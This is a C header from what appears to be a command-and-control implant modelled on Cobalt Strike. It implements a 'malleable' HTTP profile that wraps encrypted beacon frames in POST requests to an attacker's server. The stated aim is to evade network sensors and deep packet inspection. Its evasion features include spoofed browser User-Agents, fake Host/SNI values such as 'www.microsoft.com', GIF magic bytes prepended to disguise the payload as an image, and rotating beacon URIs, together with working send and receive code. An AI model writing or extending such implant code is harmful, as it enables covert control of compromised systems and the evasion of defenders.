/*
 * tls/http_profile.h  –  Malleable HTTP/1.1 transport profile
 * =============================================================
 * F-05 / CS-parity: wraps each AES-GCM frame as an HTTP/1.1 POST body so C2
 * traffic resembles ordinary HTTPS to network sensors and NGFW DPI.
 *
 * Activation
 * ----------
 * Define C2_HTTP_HOST at build time to enable this profile:
 *
 *   make C2_IP=<cdn-ip> C2_HTTP_HOST=\"cdn.example.com\" SECRET_KEY=...
 *
 * Malleable build-time macros (all optional with sensible defaults)
 * -----------------------------------------------------------------
 *
 *   C2_HTTP_HOST       — Host: header / TLS SNI (required for HTTP mode)
 *                        e.g. "www.microsoft.com"
 *
 *   C2_HTTP_URI        — POST URI for agent→C2 frames
 *                        default: "/api/v1/upload"
 *
 *   C2_HTTP_URI_POLL   — GET/POST URI for C2→agent frames (response polling)
 *                        default: same as C2_HTTP_URI
 *
 *   C2_HTTP_UA         — User-Agent header value
 *                        default: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
 *                                  AppleWebKit/537.36 (KHTML, like Gecko)
 *                                  Chrome/124.0.0.0 Safari/537.36"
 *                        Match the UA used by a popular browser on the target
 *                        OS to blend with legitimate browser traffic.
 *
 *   C2_HTTP_PREPEND    — Extra bytes prepended to the POST body before the
 *                        AES-GCM frame.  Must be a C hex-string literal, e.g.
 *                        "\x47\x49\x46\x38\x39\x61" (GIF89a magic) to make
 *                        the body start with an image header.
 *   C2_HTTP_PREPEND_LEN — Byte count of C2_HTTP_PREPEND (required when set)
 *
 *   C2_HTTP_APPEND     — Extra bytes appended to the POST body after the frame.
 *   C2_HTTP_APPEND_LEN — Byte count of C2_HTTP_APPEND.
 *
 *   C2_HTTP_EXTRA_HDRS — Additional HTTP request headers (raw, \r\n-terminated)
 *                        e.g. "Accept: */*\r\nCache-Control: no-cache\r\n"
 *
 * Rotating URIs
 * -------------
 * Up to four URIs can be specified.  The agent cycles through them in round-
 * robin order keyed on a per-session counter so each beacon uses a different
 * URI path.  Specify with C2_HTTP_URI_1 … C2_HTTP_URI_4.  If only
 * C2_HTTP_URI is defined, only one URI is used.
 *
 * Wire format (agent→C2 with prepend/append)
 * -------------------------------------------
 *   POST <uri> HTTP/1.1\r\n
 *   Host: <C2_HTTP_HOST>\r\n
 *   User-Agent: <C2_HTTP_UA>\r\n
 *   Content-Type: application/octet-stream\r\n
 *   Content-Length: <prepend_len + frame_len + append_len>\r\n
 *   <C2_HTTP_EXTRA_HDRS>
 *   Connection: keep-alive\r\n
 *   \r\n
 *   [C2_HTTP_PREPEND][AES-GCM frame][C2_HTTP_APPEND]
 *
 * C2→agent response:
 *   HTTP/1.1 200 OK\r\n
 *   Content-Length: <len>\r\n
 *   \r\n
 *   [AES-GCM frame]
 *
 * Note: cert pinning (C2_CERT_PIN) still applies.
 */

#pragma once
#ifndef TLS_HTTP_PROFILE_H
#define TLS_HTTP_PROFILE_H

#ifdef C2_HTTP_PROFILE

/* ── Defaults ────────────────────────────────────────────────────────────── */

#ifndef C2_HTTP_URI
#  define C2_HTTP_URI  "/api/v1/upload"
#endif

#ifndef C2_HTTP_UA
#  define C2_HTTP_UA \
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " \
    "AppleWebKit/537.36 (KHTML, like Gecko) " \
    "Chrome/124.0.0.0 Safari/537.36"
#endif

#ifndef C2_HTTP_EXTRA_HDRS
#  define C2_HTTP_EXTRA_HDRS  ""
#endif

#ifndef C2_HTTP_PREPEND_LEN
#  define C2_HTTP_PREPEND_LEN  0
#  define C2_HTTP_PREPEND      ""
#endif

#ifndef C2_HTTP_APPEND_LEN
#  define C2_HTTP_APPEND_LEN  0
#  define C2_HTTP_APPEND      ""
#endif

/* ── Rotating URI table ──────────────────────────────────────────────────── */
/*
 * Up to four URIs, selected in round-robin per frame.
 * If C2_HTTP_URI_1 is not defined, only C2_HTTP_URI is used.
 */
#ifdef C2_HTTP_URI_1
static const char * const _c2_http_uris[] = {
    C2_HTTP_URI_1,
#  ifdef C2_HTTP_URI_2
    C2_HTTP_URI_2,
#  endif
#  ifdef C2_HTTP_URI_3
    C2_HTTP_URI_3,
#  endif
#  ifdef C2_HTTP_URI_4
    C2_HTTP_URI_4,
#  endif
};
#  define _C2_HTTP_URI_COUNT \
    (sizeof(_c2_http_uris) / sizeof(_c2_http_uris[0]))
static volatile LONG _c2_http_uri_idx = 0;
static inline const char *_c2_pick_uri(void)
{
    LONG idx = (LONG)InterlockedIncrement(&_c2_http_uri_idx) - 1;
    return _c2_http_uris[(unsigned)idx % _C2_HTTP_URI_COUNT];
}
#else
static inline const char *_c2_pick_uri(void) { return C2_HTTP_URI; }
#endif /* C2_HTTP_URI_1 */

/* ── Includes ────────────────────────────────────────────────────────────── */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef struct _TLS_CONTEXT TLS_CONTEXT;
typedef struct _TLS_CONTEXT * PTLS_CONTEXT;

/* ── _http_send_frame ────────────────────────────────────────────────────── */
/*
 * Wrap a flat [hdr|cipher] frame as HTTP POST and send over TLS.
 * Supports prepend/append decorators and a rotating URI table.
 * pFrame points to [uint32-BE-len | cipher bytes]; cbFrame is the total size.
 */
static inline BOOL _http_send_frame(PTLS_CONTEXT pCtx,
                                     const BYTE *pFrame, DWORD cbFrame)
{
    const char *uri = _c2_pick_uri();

    DWORD bodyLen = (DWORD)(C2_HTTP_PREPEND_LEN) + cbFrame + (DWORD)(C2_HTTP_APPEND_LEN);

    /* Build HTTP header into a stack buffer */
    char hdr[1024];
    int hdrLen = _snprintf(hdr, sizeof(hdr) - 1,
        "POST %s HTTP/1.1\r\n"
        "Host: " C2_HTTP_HOST "\r\n"
        "User-Agent: " C2_HTTP_UA "\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %lu\r\n"
        C2_HTTP_EXTRA_HDRS
        "Connection: keep-alive\r\n"
        "\r\n",
        uri,
        (unsigned long)bodyLen);
    if (hdrLen <= 0) return FALSE;

    /* Allocate flat buffer: [header | prepend | frame | append] */
    DWORD total = (DWORD)hdrLen + bodyLen;
    BYTE *buf = (BYTE *)malloc(total);
    if (!buf) return FALSE;

    BYTE *p = buf;
    memcpy(p, hdr, (size_t)hdrLen);             p += hdrLen;
#if C2_HTTP_PREPEND_LEN > 0
    { static const BYTE _pre[] = C2_HTTP_PREPEND;
      memcpy(p, _pre, C2_HTTP_PREPEND_LEN);     p += C2_HTTP_PREPEND_LEN; }
#endif
    memcpy(p, pFrame, cbFrame);                 p += cbFrame;
#if C2_HTTP_APPEND_LEN > 0
    { static const BYTE _app[] = C2_HTTP_APPEND;
      memcpy(p, _app, C2_HTTP_APPEND_LEN);      p += C2_HTTP_APPEND_LEN; }
#endif
    (void)p;

    extern BOOL _tls_raw_send(PTLS_CONTEXT, const BYTE *, DWORD);
    BOOL ok = _tls_raw_send(pCtx, buf, total);
    free(buf);
    return ok;
}

/* ── _http_recv_frame_alloc ─────────────────────────────────────────────── */
/*
 * Read one HTTP/1.1 response, strip prepend/append decorators, return
 * the inner AES-GCM frame in a malloc'd buffer.  Caller must free().
 */
static inline BOOL _http_recv_frame_alloc(PTLS_CONTEXT pCtx,
                                           BYTE **ppFrame, DWORD *pcbFrame)
{
    extern BOOL _tls_raw_recv(PTLS_CONTEXT, BYTE *, DWORD);
    *ppFrame = NULL; *pcbFrame = 0;

#define HTTP_HDR_MAX 4096
    char hdrbuf[HTTP_HDR_MAX + 1] = {0};
    int hpos = 0;
    BOOL found_end = FALSE;

    while (hpos < HTTP_HDR_MAX) {
        BYTE ch = 0;
        if (!_tls_raw_recv(pCtx, &ch, 1)) return FALSE;
        hdrbuf[hpos++] = (char)ch;
        if (hpos >= 4 &&
            hdrbuf[hpos-4] == '\r' && hdrbuf[hpos-3] == '\n' &&
            hdrbuf[hpos-2] == '\r' && hdrbuf[hpos-1] == '\n') {
            found_end = TRUE;
            break;
        }
    }
    if (!found_end) return FALSE;
    hdrbuf[hpos] = '\0';

    /* Must be HTTP 200 */
    if (strncmp(hdrbuf, "HTTP/1.1 200", 12) != 0 &&
        strncmp(hdrbuf, "HTTP/1.0 200", 12) != 0)
        return FALSE;

    /* Extract Content-Length */
    const char *clpos = strstr(hdrbuf, "Content-Length:");
    if (!clpos) clpos = strstr(hdrbuf, "content-length:");
    if (!clpos) return FALSE;

    unsigned long bodyLen = 0;
    if (sscanf(clpos + 15, " %lu", &bodyLen) != 1 || bodyLen == 0)
        return FALSE;

#ifndef TLS_MAX_FRAME_SIZE
#  define TLS_MAX_FRAME_SIZE (256 * 1024 * 1024)
#endif
    if (bodyLen > (unsigned long)TLS_MAX_FRAME_SIZE) return FALSE;

    BYTE *body = (BYTE *)malloc((size_t)bodyLen);
    if (!body) return FALSE;

    if (!_tls_raw_recv(pCtx, body, (DWORD)bodyLen)) {
        free(body);
        return FALSE;
    }

    /* Strip any server-side prepend decorator bytes (same length as client sends) */
#if C2_HTTP_PREPEND_LEN > 0
    if (bodyLen <= (unsigned long)C2_HTTP_PREPEND_LEN) { free(body); return FALSE; }
    DWORD frameOff = (DWORD)C2_HTTP_PREPEND_LEN;
#else
    DWORD frameOff = 0;
#endif

    /* Strip server-side append decorator bytes */
#if C2_HTTP_APPEND_LEN > 0
    if ((bodyLen - frameOff) <= (unsigned long)C2_HTTP_APPEND_LEN) { free(body); return FALSE; }
    DWORD frameLen = (DWORD)(bodyLen - frameOff - C2_HTTP_APPEND_LEN);
#else
    DWORD frameLen = (DWORD)(bodyLen - frameOff);
#endif

    if (frameOff > 0) {
        /* Shift body in place */
        memmove(body, body + frameOff, frameLen);
    }

    *ppFrame  = body;
    *pcbFrame = frameLen;
    return TRUE;
#undef HTTP_HDR_MAX
}

#endif /* C2_HTTP_PROFILE */
#endif /* TLS_HTTP_PROFILE_H */
